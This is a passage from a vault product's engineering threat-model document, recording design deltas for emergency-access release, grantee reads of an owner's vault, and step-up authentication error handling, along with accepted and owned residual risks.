stack for this PR found the last gated action on this origin that could not ask
for a factor. `POST /v1/vault/srp/start` and `/srp/verify` both carry
`StepUpGuard`, and its 403 `stepup_required` exists — the guard's own comment
says so — to tell a well-behaved client to elevate. `renderUnlock` called
`unlock` bare, so once the vault-open step-up aged past five minutes the owner
was told "that action needs a fresh identity check, and it was not completed" on
a page holding nothing that could complete one. The vault-open handoff had NOT
expired; only the factor had, and the two are told apart nowhere on the screen.
This predates PR2 — unchanged since M15 PR2 — and is fixed here because this
screen is what every restore surface sits behind: a history nobody can reach is
not a restore surface. It is the same finding the M15 review recorded about
enrollment arriving a third time, which is what "a rule applied to one member of
a category is a rule half-applied" costs when the category is not swept.

### Residuals

- **[ACCEPTED]** *A capture time is shown to the minute, with no zone label and
  no seconds.* The first draft of this bullet recorded something worse and was
  WRONG about its own premise: `captureTime` trimmed the ISO string and rendered
  UTC, justified by `apps/vault-web/package.json` fencing dependencies to
  exactly `['zod']`. `Date` is the runtime rather than a dependency, so the
  fence never forced it, and the live drive showed what it cost — an item edited
  at 17:00 on a Sunday reported itself as changed on Monday, a wrong DATE on the
  one screen whose job is saying when something changed. Fixed rather than
  accepted; the parts are now read off the `Date`. What remains accepted is
  smaller: the rendering carries no zone label, so an owner reading their own
  history on a device set to the wrong zone reads a consistently shifted past,
  and two versions captured in the same minute are indistinguishable by their
  timestamps. Bounded because ORDER is what a restore decision rests on and the
  list is server-ordered by `revision`, not re-sorted by the rendered text.
- **[ACCEPTED]** *Neither undelete nor version restore is behind a step-up, and
  delete is.* This is the asymmetry the design rule asks for rather than a gap
  in it: the protective action must never be harder than the permissive one, and
  every action on this surface moves an item back toward the owner. Restore does
  overwrite live content, which is why the unopenable-image case above is
  withheld; what it cannot do is remove anything, since the write it performs is
  itself captured before it lands.
- **[ACCEPTED]** *The owner picks a version by time alone.* The screen lists
  when each image was captured and its item type, and says nothing about what
  changed. Rendering a diff would put two decrypted secrets on screen at once
  and would need a differ this origin has no dependency budget for. The
  consequence is a reader restoring the wrong image and needing a second restore
  to undo it — recoverable, because the restore is itself captured, but it means
  the surface is honest about the past without being useful for choosing within
  it. **M27 PR5 narrowed it and corrected two things about it.** The premise
  that the WHEN discriminates was false: `captureTime` rendered to the minute,
  so two images from one minute were two rows identical to the character, each
  offering to be put back and holding different secrets — and a restore captures
  the image it replaces, so any restore within a minute of the edit it reverses
  produced exactly that. Found by driving. Seconds are rendered now, and
  `screens-restore.spec.ts` asserts the discrimination rather than only the
  equivalence, which is the assertion that was missing. What remains is the
  original half — the list says nothing about CONTENT — and it is ACCEPTED
  rather than owned: the diff is refused on this origin for the reason above, so
  nothing is owed. The tag also claimed to be "owned alongside §6ww's
  rollback-detector item", which is `[ACCEPTED]` and has no owner, and the work
  it described is not what M39's row is named for.
## 6yy. Threat-model delta — M27 PR3a, release becomes re-collectable (2026-08-23)

**THE §5.2 CEREMONY SPENT ITSELF AND DELIVERED NOTHING, AND THAT WAS THE
DEFECT RATHER THAN THE CONTROL.** A grantee who waited out the period, was not
denied and passed the settlement gate could lose the collection to a dropped
connection or a closed tab, after which the route answered `already_released`
forever. The only recovery was the owner re-arming — which is precisely what an
incapacitated owner cannot do, in the one scenario emergency access exists for.
`release` now admits `status IN ('waiting','released')` with `releases_at`
present and elapsed, as ONE predicate rather than two guards: removing only the
`already_released` throw dropped the caller into `status !== 'waiting'` and the
same dead end under `not_requested`, which is the two-failures-one-token defect
this document forbids. That was reproduced against a real database by the PR0
review rather than reasoned from the guard order.

**NOTHING WAS EVER DESTROYED TO JUSTIFY IT.** `markReleased` writes `status`
and `released_at` and nothing else; `key_share_ct`, `platform_part` and
`wrapped_master_key_recovery` all survive it, and no release clears
`releases_at`. (An earlier draft said it was cleared "only by `markDenied`",
which is false — `markRearmed` and `markRevoked` clear it too. The conclusion
stands because all three also move `status` out of the collectable set, which
is the property actually relied on; the premise was a checkable fact stated
without checking it, and two independent review lenses caught it.) "One-shot" was a status check wearing a cryptographic one-way
door's clothes. The proof is not the reading: the integration test collects a
second time and puts the material through the same reconstruction as the first,
and `emergency-crypto.spec.ts` does it again one layer up through
`releaseAndRecover`, because a route answering 200 with material the client
cannot rebuild from would satisfy every status assertion and still strand the
person it exists for.

**THE PROTECTIVE ACTION HAD TO MOVE WITH THE PERMISSIVE ONE, AND SHIPPING THE
SERVICE HALF ALONE WOULD HAVE INVERTED THE RULE IN THE PARAGRAPH THAT CITED
IT.** `deny` is `CallerGuard` only by design — a step-up prompt between an
owner and "stop this" is a control that argues with itself — and it refused on
a released policy. Making collection repeatable behind a bare account session
while leaving the only ungated stop unavailable would have put the permissive
action one call away and the protective one behind fresh MFA, since `revoke`
carries `StepUpGuard`. `deny` now admits on a released policy and keeps its
meaning: sticky, no cooldown, no further collection until the owner re-arms.

**AND THE OWNER'S SCREEN RENDERED NEITHER STOP, WHICH IS THE HALF AN OWNER
ACTUALLY HAS.** The decision-log entry for §6uu argued re-collection was safe
because the owner can revoke a released policy — true of the service and false
of the product. `policyRow` gated deny on `status === 'waiting'` and revoke on
`status !== 'released'`, so a released policy carried NO controls at all: the
one status where a grantee can now collect with one tap was the one status
where the owner could do nothing. Both stops are rendered there now, with copy
that does not claim the release was undone — it cannot be, and telling an owner
their vault is safe again would be the most consequential lie this screen could
tell, on the screen they check to find out. The grantee's side had the mirror
gap: `granteeActions` offered collection on `waiting` alone, so the capability
had zero callers on the surface it exists for.

**THE TABLES THAT DECIDE THIS ARE NOW DERIVED FROM THE DDL.** The six statuses
were three hand-written lists in `screens-emergency.spec.ts` under a comment
claiming they were pinned to `002_emergency_access.sql` — a claim about the
tree asserted in prose, which is this repo's name for a test nobody runs. They
are read out of the CHECK constraint now, and every table asserts SET EQUALITY
with it before reading a button, so a seventh status reddens each of them by
name until somebody decides what the screens do with it. The scan reads EVERY
migration and takes the last definition, not the file that created the table:
migrations here are append-only and checksummed, so a widening can only arrive
as a later `DROP CONSTRAINT … ADD CONSTRAINT`, which is precisely what
`003_notification_kinds.sql` already does to another constraint `002` declared.
The PR3a review defeated the first draft of this scan with exactly that shape. That
decision is exactly the one skipped when `released` became collectable in the
service and stayed unofferable in the client.

**THE LAST THING ENFORCING THE OLD RULE WAS A PAIR OF TEST DOUBLES.** Once the
service stopped refusing a second collection, `emergency-crypto.spec.ts` still
answered 409 `already_released` from its fake and `screens-emergency.spec.ts`
still defaulted to it — and both suites stayed green against a server that no
longer exists. A double must be faithful about what it REFUSES, not only about
what it returns; the crypto fake now refuses only an unarmed escrow, and the
screen fake defaults to `not_requested`, which is what a release with no
elapsed `releases_at` actually answers.

**AND THE DRIVE FOUND TWO SENTENCES THE SWEEP COULD NOT.** The stale
single-use claim survived a source sweep for every spelling already known,
because `renderRelease`'s warning said it a third way — that continuing spent
the arrangement and that it could be done once. That is the LAST thing a
grantee reads before acting in an emergency, and it told them they had one
attempt, which is the exact hesitation this delta exists to remove. The fix is
paired with a ban held as DATA in `fences.spec.ts`: eight spellings, plain
substring, comments included in the corpus, with the explaining comments
written to describe those sentences rather than quote them — the M24 wording-
fence lesson applied at the point it would otherwise have bitten, since a
fence that must exempt its own documentation is a fence with a filter in it.

**THE SECOND WAS THE OWNER'S VOCABULARY READ BY THE OTHER PERSON.**
`describeGranteeStatus` fell through to `POLICY_STATUS_WORDS`, which is
written for an owner reading their own arrangement, so a denied row told the
GRANTEE "stopped by you" — the owner stopped it — on the row explaining why
their button had gone, and `configured` read "ready if you cannot", whose
"you" points at the wrong person and inverts the sentence. Found one screen
after this function grew its first grantee-specific case, which is the
half-applied rule arriving immediately: adding an override for `released` and
not asking what ELSE in that map was audience-specific left the answer in the
very next entry. Only the differing entries are overridden, and a fourth
DDL-keyed table now asserts what the grantee is told on all six statuses and
that neither second-person wording reaches them on any of them.

**AND THE ADVERSARIAL REVIEW FOUND THAT THE STOP ERASED WHAT IT WAS
STOPPING.** This is the finding the change itself created, and it is the
sharpest one. `deny` writes `denied_by_owner` over `released` and `markDenied`
clears `releases_at`, so once the owner acted, `status` no longer recorded that
the master key had been handed over — and `released_at`, which the row has
always stored, was serialized by no DTO. The owner's escrow view therefore
returned a BYTE-IDENTICAL policy for "I stopped them before anything left the
server" and "I stopped them after they rebuilt my master key": the two states
in this feature whose remedies differ most, since the second requires a vault
reset and the first requires nothing. The client made it concrete — its honest
copy branched on `status === 'released'`, so an owner who denied and then
removed a grantee holding their master key was told "that person can no longer
open this vault", the exact sentence the code calls the most consequential lie
this screen could tell, produced by the control meant to handle it.

Reinstating the refusal is NOT the fix — that restores the defect this delta
exists to remove. `releasedAt` is exposed on both policy DTOs instead: a bare
timestamp, no key material, no PII, on a column the row already had. Every
sentence is anchored on it rather than on a status another action may
overwrite, and the row itself now says a collection happened after the stop,
because the owner reading the list is deciding whether to open the controls at
all. The predicate falls back to the status when the field is ABSENT, which is
not redundancy: `releasedAt` arrives as JSON, so its type is a claim about the
server rather than a guarantee, and a service older than this origin sends
nothing — where `undefined !== null` would have announced a collection on every
row it served.

**THE REVIEW ALSO FOUND THREE THINGS THE SUITE COULD NOT SEE, ALL OF THEM
FENCES THAT WENT GREEN FOR THE WRONG REASON.** The phrase ban missed the
capitalised heading on `releaseAndRecover` itself — the module's only
description of the function that collects — because it banned one inflection of
a noun and the live text used the other; the ban now carries both, the text is
de-wrapped before searching so a line break can neither hide nor create a hit,
and the docstring's claim was narrowed to what eight substrings can actually
support. The status scan read only the migration that CREATED the table, while
append-only checksummed migrations mean a widening can only ever arrive in a
later file — proved by adding one, which the first draft could not see. And the
owner-stop table recorded only WHETHER a stop existed, accepting either label,
so the released-specific wording — the sentence this section calls the most
consequential lie — had no assertion at all, and two mutations producing the
pre-PR3a copy on a post-PR3a status survived the whole suite. Two service-side
mutations survived on the same principle: skipping the settlement gate on a
re-collection, and `collectable = true`. All five now redden by name.

### Residuals

- **[ACCEPTED]** *A released policy is a STANDING capability until the owner
  acts, where it used to be a spent one.* This is the real widening and it is
  not the obvious one. The marginal harm to the legitimate path is nil — the
  grantee who collected already holds the master key, and further collections
  hand them what they have. The case that changes is an attacker who
  compromises the GRANTEE after a legitimate collection: under one-shot the
  route answered `already_released` and gave them nothing, while now it rebuilds
  the owner's master key for them. What bounds it is that the protection being
  given up was largely illusory — it held only against an attacker whose victim
  had used THIS client, which wipes the recovered key and retains nothing, and
  nothing forces a grantee to use it. What replaces it is active rather than
  passive: the attacker must open the grantee's OWN vault by SRP (a stolen
  session reaches the route and comes away with ciphertext it cannot open, which
  `emergency-crypto.spec.ts` proves), every collection re-notifies the owner,
  re-emits `vault.emergency.released` and re-runs the settlement gate, and
  either stop is one owner action. A control that is spent protects nobody after
  it is spent; one that fires every time is the trade this takes.
- **[ACCEPTED]** *A denial cannot un-release what the grantee already holds.*
  The escrow material left the server on the first collection and the master key
  was rebuilt on the grantee's device; no server action reaches it. What both
  stops end is the arrangement's ability to hand over MORE. This is stated here
  because the copy on the owner's screen is the only place a person learns it,
  and the temptation to write a reassuring sentence there is exactly what this
  bullet exists to refuse.
- **[ACCEPTED]** *Nothing caps how many times a released policy can be
  collected.* Visibility is the control rather than a counter: each collection
  notifies and audits, and the integration test asserts an EXACT count of two
  after two collections rather than a floor, so a silent third cannot pass. A
  cap would have to choose a number, and any number it chose would strand the
  grantee whose Nth attempt is the first that arrives — which is the failure
  this whole delta removes.
- **[OWNER: M30]** *A repeat collection is announced with the same notification
  kind as the first.* The owner is told every time, but `released` carries no
  ordinal, so a second collection and a duplicated delivery of the first read
  identically to the person deciding whether to press stop. The visibility
  argument above rests on that message, which makes this the weakest link in it.
  Owned by M30 rather than fixed here because a new notification kind is a
  producer/consumer deploy ordering question and M30 already owns this feature's
  notification work.
- **[CLOSED: §6zz]** *The grantee's row names the owner by raw account id.* It
  read "Vault of <uuid>", and M27 had already fixed exactly this on the OWNER's
  side — a row of UUIDs cannot be checked against what somebody intended — so
  this was that rule half-applied, found by driving the stack rather than by
  sweeping for it. PR3b closes it, and the premise recorded here turned out to
  be **wrong in a way worth keeping**: this bullet assumed a name existed and
  only needed releasing, on the model of the owner's own screen reading one out
  of their contact list. **There is no such name.** `profile` has no
  display-name column at all — a person's name exists ONLY inside other users'
  per-user-encrypted contact rows — so "serve the owner's name" was never a
  disclosure decision, it was a request for a new Zone B identity field. PR3b
  answers the question the residual actually asked, "which name, released to
  whom", with a string the OWNER writes for this purpose. See §6zz.

## 6zz. Threat-model delta — M27 PR3b, the grantee's read (2026-08-24)

**THE §6yy `[OWNER: M27]` ITEM IS CLOSED BY THIS DELTA**, and its premise is
corrected there rather than quietly dropped.

PR0 designed this surface (§6uu) and deferred it; PR3a made the collection that
precedes it repeatable (§6yy). This is the read itself: `GET
/v1/vault/emergency-access/:policyId/items` — ONE route, the first place in the
platform where one user is handed another user's Zone A rows.

**What authorizes it, in the order a request meets it.** (1) `VaultSessionGuard`
on the GRANTEE's own vault — unchanged and unwidened, so an attacker holding
only an account session reaches nothing; the authority to read somebody else's
rows comes from the policy row, never from a widened session. (2)
`requireGranteePolicy`, locking by `(id, grantee_user_id)` together, so "no such
policy" and "not your policy" are one empty result and one 404. (3)
`status = 'released'`, re-read INSIDE the transaction — this is what makes PR3a's
one-tap stop stop something, since `markDenied`, `markRearmed` and `markRevoked`
all move status out of the collectable set. (4) The settlement gate, re-checked
per read (§5.1 control 5): an estate can enter settlement between a legitimate
collection and a read days later, and Zone A is the stage that must come last.
(5) Cedar, over a ninth action id in a new `vault.cedar` — see the residual
below for what that layer is and is not worth.

**`owner.cedar` is untouched and no guard is widened**, which is the property
§6uu asked PR3b to preserve. The new policy is narrowed twice — by action id
(`read_by_grantee`, never `read`) and by resource type (`resource is VaultItem`)
— because `loadBundledPolicies()` concatenates every `.cedar` into EVERY
service's PDP. The grantee set is carried on an attribute deliberately NOT named
`namedBeneficiaries`: `beneficiary.cedar` permits plain `read` on anything
carrying that name, so reusing it would have handed every named beneficiary a
Zone A vault read, which §5.5 forbids.

**The owner is told twice, about two different facts.**
`emergency.released` says the escrow was COLLECTED; `vault.read_by_grantee` says
the contents were OPENED. A grantee can collect and never read, and the owner's
decision about whether to press stop turns on which happened. The read notice
fires once per COLLECTION rather than once per read, derived from
`emergency_access_notifications` (`created_at >= released_at`) with no new
column — which re-arms by itself on each fresh collection, where a stored flag
would have needed resetting by each of the four writers that move a policy in
and out of `released`.

**The audit trail is deliberately out of step with the notification.**
`vault.emergency.items_read` — declared with no producer since PR0 — is emitted
per READ, on the OWNER's trail with the grantee as actor and `onBehalfOf` set
explicitly. Audit is the complete record an investigator reads afterwards;
notification is an interrupt a living owner must be able to act on. Making the
trail sparse to spare the mailbox would trade away the wrong one.

**What the grantee cannot do.** No version history, no restorable list, no
undelete, no restore, no write of any kind: `vault.cedar` names one action and
the owner's other four are separate ids precisely so a grant of one is not a
grant of the rest (M27 PR1b). The recovered key is imported NON-EXTRACTABLE with
`decrypt` and `unwrapKey` only — no `encrypt`, no `wrapKey` — so the browser
itself refuses to seal anything into the owner's vault, and the reading screens
render no control that could try.

**That browser guarantee did not hold as first shipped, and the PR3b review is
why it does.** `unwrapKey` is genuinely required to open an item, and
`decryptItem` unwrapped each per-item content key with `['encrypt', 'decrypt']`
— so the granted key DID yield keys that produce valid owner ciphertext, and the
only thing preventing a forged blob was that no route accepts one from a
grantee. An absence of callers is not a platform guarantee, and a future
grantee-facing write path reviewed against the old sentence would have been
reviewed against something false. `packages/vault-crypto` now unwraps with
`['decrypt']` alone — it never encrypted with that key anyway, and `encryptItem`
generates a fresh item key rather than unwrapping one, so nothing else wanted
the wider set. `packages/vault-crypto/test/items.spec.ts` observes the usages
`decryptItem` actually requests, so the claim is checked rather than asserted.

### Residuals

- **[ACCEPTED]** *The Cedar layer on this route cannot deny, today.* Deleting
  the `assertCan` call leaves the entire suite green except the one test written
  to pin its shape, and that is the honest result rather than a weak test:
  `listReleasedGranteeIds` selects the owner's policies at `status='released'
  AND deleted_at IS NULL`, and guard (2) has already returned THIS row under the
  same two filters — so the principal is in the set by construction. Two
  derivations of one row cannot disagree. It stays for uniformity (every other
  read in this service consults the PEP, and the single read that did not would
  be an exception a reader has to discover) and because it is the attachment
  point: a later narrowing by item type or settlement stage is a change to
  `vault.cedar` and to the resource built at that call site, and to nothing
  else. What actually refuses a stopped grantee is guard (3), and the suite
  names which layer each refusal test proves.
- **[ACCEPTED]** *The read notice is deduped on the ATTEMPT, not the delivery.*
  A `vault.read_by_grantee` whose send fails is not retried on the next read of
  the same collection, so the owner's only remaining signal for it is the
  `emergency.released` they were already sent. Delivery-keyed dedupe was
  rejected because a dead channel would turn one grantee's reading session into
  a message per item — a notification storm is not a safety property. The
  failure is recorded the way every other non-delivery on this table is, as a
  null `delivered_at`.
- **[ACCEPTED]** *The dedupe is atomic only within one policy.* The claim row is
  written inside the transaction that holds the policy `FOR UPDATE`, so two
  racing first-reads of the same policy serialise. Nothing serialises across
  policies, and nothing needs to: the predicate is per-policy.
- **[ACCEPTED]** *The escrow label is free text one user writes and another
  reads* — the first such string in Zone A's schema. It is REFUSED rather than
  repaired at the edge: no control characters, no bidi or invisible format
  characters, 80 characters, and a DDL CHECK behind that as the backstop for any
  writer that is not the route. There is no markup path to sanitise, because
  `dom.ts` builds every node and text goes in as a text node. What remains is
  that an owner can write anything short and printable into a string their
  grantees will read, which is what "the owner chooses what they disclose"
  means.
- **[OWNER: M30]** *Changing the label means re-arming the whole escrow.*
  `configure` replaces an arrangement wholesale — it retires every policy, sends
  `grantees_changed`, and requires the owner to redo the fingerprint ceremony —
  so correcting a typo in a name costs the same as rebuilding the arrangement.
  The label is optional and falls back to the account id, so nobody is blocked;
  but an owner who wants a clearer name for their family has to disturb every
  grantee to get one. Owned by M30 with the rest of this feature's surface work
  rather than fixed here, because a label-only route is a new write path into
  the escrow and wants its own gating decision.
- **[ACCEPTED]** *A reading grantee holds the owner's master key for the life of
  their own vault session.* It lives in the one module that holds keys, is
  cleared by the same explicit lock and the same idle timer as their own vault,
  and is non-extractable and read-only. It cannot be persisted — this origin has
  no client-storage design, which is also why §6uu's blob-version item is still
  open. A grantee who walks away is protected by the idle lock and by nothing
  else, which is the same protection their own vault has.

  **THAT LAST SENTENCE WAS FALSE AS FIRST WRITTEN**, and the PR3b review found
  it. `collectGrant` checked the session before its two awaits and wrote the
  recovered key after them unconditionally, so a lock landing in that window was
  silently undone: the key was installed on a session already marked `locked`,
  where `touch()` returns early and never arms another idle timer. The key then
  outlived the control this residual leans on. `collectGrant` now re-checks that
  `#vault` is the same object it started with — identity, so a lock AND a
  lock-then-unlock are both caught — and refuses with `vault_locked` otherwise.
  Aborting costs a collection and not the arrangement, because PR3a made release
  repeatable. The residual stands as written now that the mechanism it names
  actually holds.

- **[OWNER: M39]** *The vault origin does not carry the step-up propagation
  budget the other two origins carry, so a user who completes step-up quickly is
  told they did not.* Found by driving the real app for this PR and pre-existing
  since M13, which is why it is re-owned rather than fixed here.
  `HttpSessionVerifier` positive-caches a session for `DEFAULT_CACHE_TTL_MS`, so
  for up to one TTL after a successful `POST /v1/auth/stepup` a peer service
  still answers from a cached un-elevated session. `apps/web/src/lib/step-up.ts`
  documents exactly this and exports `STEP_UP_PROPAGATION_BUDGET_MS`;
  `apps/operator-web` carries the same shape, each with a test asserting parity
  against `verifier.ts`. `apps/vault-web` retries ONCE and then reports "That
  action needs a fresh identity check, and it was not completed" — a sentence
  that is false about what happened, on the origin with the MOST step-up-gated
  actions (vault open, keyset create, add item, arm emergency access, reset).
  MEASURED against the running stack rather than argued: first gated call 403,
  step-up 200, identity immediately reporting `mfaLevel: stepup`, the single
  retry 403, fifteen consecutive 403s, elevation visible at T+30.1s. The
  harness's own first draft is the positive control — it waited for an unspent
  TOTP window BETWEEN the probe and the step-up, putting 30s inside the measured
  interval, and the identical retry succeeded. So the failure gets LIKELIER the
  faster the user types. M39 rather than M27 because the fix is the third copy
  of a shape two other origins already have, and choosing between "a third copy"
  and "one shared client module" is a client-architecture decision that does not
  belong inside a Zone A read; it is vault-local and unblocked, which is what
  that row collects.
- **[ACCEPTED]** *The grantee-key lookup narrows a participation oracle rather
  than closing it.* `GET /v1/vault/recovery-key/:granteeUserId` carried NO
  vault-session guard while its sibling `GET /v1/vault/recovery-key` — twelve
  lines above it in the same controller, whose docstring says a session alone
  "should not be enough to fetch it either" — carried one. The Cedar call beside
  it could not close the gap and was worse than absent: it asked
  `assertCan(actor, 'read', vaultResource(actor))`, which `owner.cedar` permits
  unconditionally when `resource.owner == principal` and no `forbid` exists in
  the bundle, so it was a TAUTOLOGY that could never deny anybody. Any
  authenticated account could therefore ask about any user id it could name.
  What is disclosed is not the risk — the value is a P-256 public key published
  so strangers can seal to it, and its private half is wrapped under the target's
  own master key — the EXISTENCE answer beside it is: a 200 says "this id has a
  vault keyset AND has published a recovery key", which `app.ts` tells the owner
  in as many words is not something they should be able to probe. M27 PR5 put
  `VaultSessionGuard` on the route and DELETED the tautology rather than
  repointing it, because no Cedar action expresses "may read another user's
  published key" and inventing one to make a gate look present is the same
  defect wearing a policy file. Accepted rather than owned because the bound is
  now a real one and the residue is inherent: a caller holding their own vault
  password and Secret Key can still learn that a user id participates, which is
  what the feature requires them to learn before sealing a share. The int suite
  asserts the refusal fires BEFORE the parameter is read, so the 403 carries no
  information about who exists.

## 6aaa. Threat-model delta — M27 PR6, the extension's step-up refusals (2026-08-24)

**A refusal reached the user wearing another refusal's face, in both
directions at once.** PR5's review fan-out found it and PR5 did not fix it —
and, checked rather than assumed, it was written down NOWHERE. Not in this tree,
and not in PR #164's body either, which records only the findings PR5 closed. It
survived in a working conversation, which is the weakest place a known defect
can live: nothing there is derived, nothing is fenced, and nothing outlives the
session. That is why it is recorded here before it is described.

`POST /v1/auth/stepup` refuses a wrong authenticator code with `401
invalid_code`. The extension's `failureFor` maps that to `INVALID_CODE`, whose
sentence in `copy.ts` is written for a refused PAIRING code — "Codes work once
and expire after ten minutes — create a new one in Estate under Security."
Every clause of it is false of a TOTP, which lasts about thirty seconds, is read
off an authenticator, and cannot be created anywhere in Estate. Someone who
mistyped one digit was sent to a different screen to solve a problem they did
not have.

The step-up screen did carry a TOTP sentence. It was keyed on
`UNAUTHENTICATED`, so it fired on the OTHER case — a device whose pairing had
actually been revoked — and told that user to "try the current one", advice that
can never succeed for a credential that no longer exists. Two refusals with
opposite remedies, each answered with the other's.

**THE CAUSE IS AN INHERITED DISCRIMINATOR, AND IT IS WORTH NAMING AS A SHAPE.**
The branch was lifted from `apps/vault-web/src/client/stepup.ts`, where
`UNAUTHENTICATED` IS the right code: that origin's `failureFor` maps EVERY 401
to it. The extension's does not — it splits 401 into `invalid_code`,
`srp_failed` and the rest — so the identical expression names a different
failure in the file it was copied into. Copying a conditional without the
mapping it depends on type-checks perfectly and means something else, which is
this repo's discriminant rule applied to error surfaces.

**The guessing bound read as an outage.** identity refuses a capped step-up with
`429 too_many_attempts` and gives it its own token deliberately — the helper's
comment says "never `invalid_code`, which already means 'that code was wrong'",
citing the M12 lesson about one token changing meaning with the surface. The
extension had no 429 branch, so the cap fell to `UNKNOWN` and rendered "Something
went wrong. Please try again in a moment.", inviting exactly the retry it was
refusing. `apps/bff` took this member at M19 PR4, `apps/operator-web` at M21 PR3a and
`apps/vault-web` at M27 PR5 — one PR before this one. The extension was the
fourth client on the same ceremony and the one nobody came back to: four PRs
spread across nine milestones to apply one rule to one category. The bff's own
comment dates the BOUND to M17, which is a different fact from when any client
learned to word it, and conflating the two is how this delta first mis-stated
its own census.

**What is fenced now.** The refusal corpus is walked out of identity's own
source — the guards decorating the `stepup` handler, plus the transitive closure
of private methods `stepUp` calls — so a refusal added to either arrives red
rather than unnoticed. Measured: inserting one throw into `stepUp` reddens the
fence and names the token; disabling the closure walk reddens it too.

THE WALK DECLARES ITS OWN BLIND SPOTS, because a corpus narrower than its
guarantee goes green for the same reason it is wrong — and the first draft of
this fence had two. A `this.X(` call that resolves to no method body is
indistinguishable from a method containing no throws, so the walk would step
over a whole subtree and report a shorter, entirely plausible answer; and the
parser reads only `throw new X({ error: … })`, while the file it walks spells
seven refusals as `throw invalidCredentials()`. None of those is reachable from
`stepUp` today, but "not today" is precisely the claim that rots. Both now turn
the fence RED and name the offending method rather than shrinking it in silence,
and both were proved by mutation. An adversarial lens found this; the same lens
found the fence's unclassified check inspecting only status 400 while its test
claimed every refusal. The
assertions are DISCRIMINATION rather than coverage, because "every refusal
renders a sentence" is satisfied by a screen rendering one sentence for all of
them, which is the defect. Measured limitation, recorded rather than implied:
the pairwise check is blind to a SWAP, since a permutation preserves
distinctness — reverting the discriminator leaves it green, and the two
per-refusal tests are what catch that.

**Residuals, stated rather than implied.**

- **[CLOSED: §6bbb]** *The vault origin's own step-up prompt still shares one
  sentence between a rejected code and a dead session.*
  `apps/vault-web/src/client/stepup.ts` answers both with "That code was not
  accepted. Codes last about 30 seconds — try the current one", because that
  origin collapses every 401 into `UNAUTHENTICATED` and cannot tell them apart.
  A user whose session has expired mid-ceremony is told to retype a code, which
  will fail for as long as they keep doing it, and the remedy they actually need
  — re-authenticate — is never named. Not fixed here because splitting 401 on
  that origin changes a code that four other sites consume, one of which
  (`app.ts`'s key-change path) synthesises `UNAUTHENTICATED` locally to mean
  something else entirely; doing it blind would reproduce the very
  inherited-discriminator defect this delta closes. It needs its own change and
  its own drive against the running origin.
- **[CLOSED: §6ccc]** *An expired ACCESS TOKEN reads as an un-paired device on
  every screen in the extension's vault half.* `vault-screens.ts` takes a raw
  `bearer` and calls the API with it directly at all eight of its call sites,
  never through `withSession` — which is the thing that refreshes and which
  `popup.ts` does use. The access token lives fifteen minutes and the session
  thirty days, so a popup held open across that boundary answers every action
  with `UNAUTHENTICATED`, and `messageFor` says "This device is no longer
  connected to your account … Connect it again to continue" about a pairing that
  is perfectly alive. Nothing is un-paired — `vault-screens` only renders,
  unlike `popup.ts`'s `refreshStatus`, which forgets the credential on that code
  — so this is misleading copy rather than lost state. It PREDATES this delta
  and is not caused by it: the step-up screen previously answered the same case
  with "that code was not accepted", which was wrong differently. Recorded here
  because this delta is what made the eighth surface consistent with the other
  seven, and consistency is what makes the shared gap visible. Found by an
  adversarial lens asking whether the new fall-through's precondition holds.
- **[CLOSED: §6ccc]** *The extension's revocation predicate carries an unreachable
  disjunct.* `withSession` treats a refused refresh as a revoked pairing when
  the code is `UNAUTHENTICATED` **or** `INVALID_CODE`, but `POST
  /v1/auth/refresh` throws only `invalid_token`, so the second disjunct cannot
  fire. Harmless today and left alone rather than tidied mid-change: it is a
  false claim about reachability sitting inside the predicate that decides
  whether a working credential gets forgotten, and the failure mode of a later
  edit is somebody making it true.

## 6bbb. Threat-model delta — M44 PR1, the vault origin's step-up refusals (2026-08-25)

**THE §6aaa `[OWNER: M44]` MIRROR ITEM IS CLOSED BY THIS DELTA**, and the risk
recorded against it turned out to be overstated — corrected here rather than
quietly dropped.

§6aaa said splitting 401 on this origin "changes a code that four other sites
consume, one of which (`app.ts`'s key-change path) synthesises `UNAUTHENTICATED`
locally to mean something else entirely", so a careless split would reproduce
the very inherited-discriminator defect M27 PR6 closed. (The phrase "not a
one-line change" was docs/04's M44 queue row at `5301adf`, not §6aaa's — and
this PR's own rewrite of that row is what removed it, so the misquote pointed
at a sentence twice over. An earlier draft of this paragraph put it in
quotation marks against the wrong record, and the
local-synthesis count with it. There are in fact TWO local syntheses —
`app.ts`'s `.catch` on the unlock path and `vault-session.ts`'s
`changePassword` arm, where a failed local re-derivation is the key-change
refusal §6aaa was pointing at —
so §6aaa undercounted, and quoting it as saying "two" repaired its number while
misreporting what it said. Both errors are the same one: writing down what a
record ought to have said.) The premise is true and the conclusion was wrong.
`UNAUTHENTICATED` here really is doing FOUR jobs — a vault session that ended,
the vault service's `srp_failed`, a locally synthesised key-derivation failure,
and a refused step-up code — but splitting out ONLY `invalid_code` touches none
of the others: the vault service's sole 401 token is `srp_failed`, both local
syntheses keep their own spelling, and `invalid_code` is reachable on exactly
one route this client calls. The scout is what established that; the residual
was written from the four-consumer count alone.

**THE FIX IS A DELETION, and that is the interesting part.** M27 PR6 fixed the
same defect in `apps/vault-extension` by re-keying the prompt's special case
onto `INVALID_CODE`. Here the special case is REMOVED and `messageFor` owns the
sentence. The two clients need opposite fixes for one defect because their
`invalid_code` have different REACH: the extension's serves two ceremonies
(pairing redemption and step-up) so the map cannot serve both and the call site
must choose, while this origin's serves one, so a discriminator that could be
inherited wrongly simply stops existing. Prefer the ABSENCE to the branch.

**What the prompt said before.** `UNAUTHENTICATED` reached it as a refused code,
so a vault session that had ENDED mid-ceremony was answered "That code was not
accepted. Codes last about 30 seconds — try the current one." — a user with no
authority left, told to retype indefinitely, while the remedy they needed
(open the vault again from Estate) was never named. The arm also caught
`INVALID_REQUEST`, which `CODE_PATTERN` makes unreachable, and it was justified
by a comment asserting identity answers `invalid_credentials` for a rejected
TOTP. It does not; that is the LOGIN refusal. The comment had been false since
M15.

**THE TEST THAT SHOULD HAVE CAUGHT IT WAS GREEN FOR TWO INDEPENDENT WRONG
REASONS**, and this is the part worth carrying forward. `says what THIS form
holds when a code is refused` drove the prompt with `401 invalid_credentials` —
a token this route never sends — and asserted `/codes last about 30 seconds/i`
against `document.body.textContent`. The form's own HINT reads "From your
authenticator app. Codes last about 30 seconds.", present from the moment the
prompt renders. So the assertion matched the hint rather than the refusal and
could not fail: measured, it stays green when the fixture is pointed at a 503
rendering a completely different sentence, and it stayed green when the branch
it existed to protect was deleted outright. A fixture aimed at the wrong
boundary AND an assertion whose corpus was wider than its claim, in one test.
The refusal assertions now read `p.status-error`, and a named CONTROL asserts
the hint is present before any refusal, so the reason for that scoping cannot
rot.

**Three layers, each saying which one it proves.** `stepup.spec.ts` proves the
